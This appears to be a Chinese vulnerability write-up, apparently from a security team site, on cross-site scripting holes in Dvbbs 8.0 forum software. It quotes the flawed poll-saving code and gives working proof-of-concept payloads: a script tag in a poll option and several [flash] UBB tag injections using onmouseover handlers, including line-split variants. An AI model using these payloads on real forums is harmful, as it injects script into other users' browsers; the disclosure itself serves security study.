@@ -1,0 +1,59 @@
+动网8.0最新XSS漏洞
+
+[动网8.0最新XSS漏洞 全文]
+[原创]动网8.0最新XSS漏洞
+信息来源：邪恶八进制信息安全团队（www.eviloctal.com）
+文章作者：落叶纷飞&华夏鸡
+
+    savepost.asp文件漏洞代码如下：
+.....省略........
+vote=Dvbbs.Checkstr(trim(Replace(request.Form("vote"),"|","")))
+.....省略.......
+Dvbbs.execute("insert into dv_vote (vote,votenum,votetype,timeout,UArticle,UWealth,UEP,UCP,UPower,LockVote) values (''"&vote&"'',''"&votenum&"'',"&votetype&",''"&votetimeout&"'',"&UArticle&","&UWealth&","&UEP&","&UCP&","&UPower&","&LockVote&")")
+......省略.......
+    checkstr函数代码如下：
+Public Function Checkstr(Str)
+If Isnull(Str) Then
+CheckStr = ""
+Exit Function 
+End If
+Str = Replace(Str,Chr(0),"")
+CheckStr = Replace(Str,"''","''''")
+End Function
+    变量vote只过滤了单引号、%00和|，但是在测试的过程中，居然是过滤了双引号“"”，单引号“''”并没有过滤。我们随便进入一个版块，然后发投票帖，在投票选项里添加“<script>alert(''落叶纷飞'')</script>”，如图1，效果如图2。
+
+ 
+
+ 
+    后面这三个跨站漏洞是因为UBB标签过滤不严，应该算是致命的了吧，正则表达式超麻烦，代码又N多，我就不发漏洞代码出来了，有兴趣的可以去看savepost.asp和ubblist.asp这两个文件。漏洞存在于[flash]、[RM]和[MP]，其实[img]等都存在，只不过要绕比较大的弯子，我也懒得去绕了，这里以[flash]标签做漏洞说明。我们进入一个版块，选择发表新帖子，然后输入[flash]http://" onmouseover=java:alert("leaves") aa="s[/flash],然后发表，弹出窗口了吧。如图3，4所示。  =)
+
+ 
+
+ 
+    由于要等到把鼠标移到链接上时才能触发XSS语句，所欲这里我们可以把代码变通一下，如：“http://" onmouseover=java:alert("leaves") aa="ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss”这样就能把范围拉大了。还可以这样：
+
+[flash]
+http://" onmouseover=java:alert("华夏鸡") aa="s
+1
+1
+1
+1
+1
+1
+1
+1
+1
+11
+[/flash]
+
+    如果要在回复里用分行跨站的话要这样写：
+[flash]http://" onmouseover=java:alert("华夏鸡") aa="s
+1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+1aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[/flash]
+
+    用分行来跨～！！更加狠毒～～！.....
